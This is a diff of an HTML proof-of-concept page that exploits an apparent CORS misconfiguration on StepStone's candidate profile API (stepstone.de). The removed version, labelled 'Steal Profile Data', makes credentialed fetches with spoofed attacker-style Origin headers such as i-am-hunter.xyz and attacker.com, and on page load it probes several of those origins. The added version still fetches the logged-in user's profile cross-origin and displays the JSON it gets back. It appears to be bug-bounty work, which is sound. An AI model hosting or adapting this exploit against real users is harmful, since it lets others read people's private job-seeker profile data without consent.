@@ -1,93 +1,50 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <title>CORS Exploit PoC - StepStone</title>
+  <meta charset="utf-8" />
+  <title>StepStone CORS PoC — Controlled Domain</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui, -apple-system, Arial; padding: 18px; }
+    pre { white-space: pre-wrap; word-break: break-word; max-height: 60vh; overflow:auto; background:#f6f7f9; padding:12px; border-radius:6px;}
+    .ok { color: darkgreen; }
+    .bad { color: darkred; }
+  </style>
 </head>
 <body>
-    <h1>CORS Misconfiguration Exploit</h1>
-    <button onclick="exploit()">Steal Profile Data</button>
-    <div id="result"></div>
+  <h1>StepStone CORS PoC</h1>
+  <p>This page demonstrates cross-origin fetch from a controlled domain. Only run while authenticated to your StepStone account (use your test account).</p>
+  <button id="run">Run fetch</button>
+  <div id="results"></div>
+  <pre id="output">No attempt yet.</pre>
 
-    <script>
-    async function exploit() {
-        const resultDiv = document.getElementById('result');
-        resultDiv.innerHTML = '<p>Attempting to steal profile data...</p>';
-        
+  <script>
+    const out = text => { document.getElementById('output').textContent = text; console.log(text); }
+    async function run() {
+      out('Attempting fetch to https://www.stepstone.de/candidate/profile/editor/api/v1/profile ...');
+      try {
+        const res = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
+          method: 'GET',
+          credentials: 'include', // send cookies
+          mode: 'cors' // allow CORS behavior
+        });
+        // log response headers
+        const aco = res.headers.get('Access-Control-Allow-Origin');
+        const acc = res.headers.get('Access-Control-Allow-Credentials');
+        out(`Response status: ${res.status}\nAccess-Control-Allow-Origin: ${aco}\nAccess-Control-Allow-Credentials: ${acc}\n\nAttempting to parse JSON (if readable) ...`);
+        // try to read JSON (will fail if CORS blocks)
+        const text = await res.text();
         try {
-            // First, let's try without additional headers to see what happens
-            const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
-                method: 'GET',
-                credentials: 'include', // This sends cookies
-                headers: {
-                    'Origin': 'https://www.stepstone.de.i-am-hunter.xyz',
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
-                    // Note: We're NOT including X-Csrf-Token to see if it works without it
-                }
-            });
-
-            console.log('Response headers:', Object.fromEntries(response.headers.entries()));
-            
-            const acao = response.headers.get('Access-Control-Allow-Origin');
-            const acac = response.headers.get('Access-Control-Allow-Credentials');
-            
-            resultDiv.innerHTML = `
-                <h3>CORS Headers:</h3>
-                <p>Access-Control-Allow-Origin: <strong style="color: red">${acao}</strong></p>
-                <p>Access-Control-Allow-Credentials: <strong style="color: red">${acac}</strong></p>
-                <p>Status: <strong>${response.status} ${response.statusText}</strong></p>
-            `;
-
-            if (response.ok) {
-                const data = await response.json();
-                resultDiv.innerHTML += `
-                    <h3 style="color: red">🚨 EXPLOIT SUCCESSFUL - Profile Data Stolen:</h3>
-                    <div style="background: #ffebee; padding: 15px; border: 2px solid red;">
-                        <pre>${JSON.stringify(data, null, 2)}</pre>
-                    </div>
-                `;
-            } else {
-                resultDiv.innerHTML += `
-                    <p>Response not OK. Let's try to read the error:</p>
-                    <pre>${await response.text()}</pre>
-                `;
-            }
-
-        } catch (error) {
-            resultDiv.innerHTML = `<p style="color: red">Error: ${error.message}</p>`;
+          const json = JSON.parse(text);
+          out('✅ JSON received:\n' + JSON.stringify(json, null, 2));
+        } catch (e) {
+          out('⚠️ Response body received but not JSON-parsed (possibly blocked).\nRaw body:\n' + text.slice(0,5000));
         }
+      } catch (err) {
+        out('Fetch error: ' + String(err));
+      }
     }
-
-    // Test multiple origins to find which ones work
-    async function testAllOrigins() {
-        const origins = [
-            'https://www.stepstone.de.i-am-hunter.xyz',
-            'https://stepstone.de.i-am-hunter.xyz',
-            'https://www.stepstone.de.attacker.com',
-            'https://stepstone.de.attacker.com',
-            'https://attacker-stepstone.de.com'
-        ];
-
-        for (const origin of origins) {
-            try {
-                const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
-                    method: 'GET',
-                    credentials: 'include',
-                    headers: { 'Origin': origin }
-                });
-                
-                console.log(`Origin: ${origin}`, {
-                    ACAO: response.headers.get('Access-Control-Allow-Origin'),
-                    Status: response.status
-                });
-            } catch (e) {
-                console.log(`Origin: ${origin} - Error: ${e.message}`);
-            }
-        }
-    }
-
-    // Run origin tests
-    testAllOrigins();
-    </script>
+    document.getElementById('run').addEventListener('click', run);
+  </script>
 </body>
 </html>
